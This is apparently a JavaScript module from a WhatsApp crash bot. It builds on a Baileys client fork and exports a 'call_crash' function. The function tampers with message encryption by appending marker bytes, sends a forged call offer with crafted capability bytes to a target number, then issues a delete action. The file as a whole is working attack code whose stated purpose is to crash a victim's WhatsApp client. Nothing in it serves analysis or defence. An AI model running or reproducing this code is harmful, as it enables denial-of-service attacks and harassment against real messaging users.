import { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } from "@rexxhayanasi/elaina-baileys";
import crypto from "crypto";

export const version = "1.2.0";
export const hash = "XOVALIUM_CORE_PROTOCOL";

/**
 * Advanced Call-Protocol Crash
 */
export async function call_crash(sock, target) {
    // Note: this function requires complex internal Baileys logic
    // We expect the engine to provide necessary utilities or handle this specifically
    // but for now we keep the implementation modular here.
    
    try {
        const devices = (
            await sock.getUSyncDevices([target], false, false)
        ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

        await sock.assertSessions(devices);

        const cmute = () => {
            const locks = new Map();
            return {
                async mx(key, fn) {
                    while (locks.has(key)) await locks.get(key);
                    const lock = Promise.resolve().then(() => fn());
                    locks.set(key, lock);
                    try { return await lock; } finally { locks.delete(key); }
                }
            };
        };

        const mute = cmute();
        const appendBufferMarker = (buffer) => {
            const newBuffer = Buffer.alloc(buffer.length + 8);
            buffer.copy(newBuffer);
            newBuffer.fill(1, buffer.length);
            return newBuffer;
        };

        sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
            if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
            const processedMessage = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
            const messagePairs = Array.isArray(processedMessage)
                ? processedMessage
                : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }));

            const { id: meId, lid: meLid } = sock.authState.creds.me;
            const localUser = meLid ? jidDecode(meLid)?.user : null;
            let shouldIncludeDeviceIdentity = false;

            const nodes = await Promise.all(
                messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
                    const { user: targetUser } = jidDecode(jid);
                    const { user: ownUser } = jidDecode(meId);
                    const isOwnUser = targetUser === ownUser || targetUser === localUser;
                    const isSelf = jid === meId || jid === meLid;

                    if (dsmMessage && isOwnUser && !isSelf) msg = dsmMessage;
                    const encodedBytes = appendBufferMarker(encodeWAMessage(msg));

                    return mute.mx(jid, async () => {
                        const { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: encodedBytes });
                        if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
                        return {
                            tag: 'to',
                            attrs: { jid },
                            content: [{
                                tag: 'enc',
                                attrs: { v: '2', type, ...extraAttrs },
                                content: ciphertext
                            }]
                        };
                    });
                })
            );

            return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
        };

        const cid = crypto.randomBytes(16).toString("hex").toUpperCase();
        const { nodes: destinations, shouldIncludeDeviceIdentity } =
            await sock.createParticipantNodes(devices, { conversation: "call-initiated" }, { count: '0' });

        const stan = {
            tag: "call",
            attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
            content: [{
                tag: "offer",
                attrs: { "call-id": cid, "call-creator": sock.user.id },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    { tag: "net", attrs: { medium: "3" } },
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }] : [])
                ].filter(Boolean)
            }]
        };

        const deleteNode = {
            tag: "action",
            attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id, type: "set" },
            content: [{
                tag: "delete", attrs: { for: "true" },
                content: [{ tag: "item", attrs: { jid: target, t: Math.floor(Date.now() / 1000).toString() } }]
            }]
        };

        await sock.sendNode(stan);
        await sock.sendNode(deleteNode);
        
    } catch (error) {
        console.error('Error in kernel call_crash:', error);
    }
}
